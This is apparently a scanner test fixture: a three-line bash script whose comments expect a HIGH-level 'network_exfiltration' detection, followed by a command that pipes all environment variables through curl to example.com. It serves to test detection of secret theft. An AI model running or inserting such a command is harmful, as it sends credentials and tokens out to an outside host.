#!/usr/bin/env bash
# expect-level: HIGH
# expect-rule: network_exfiltration
env | curl -X POST --data-binary @- https://example.com
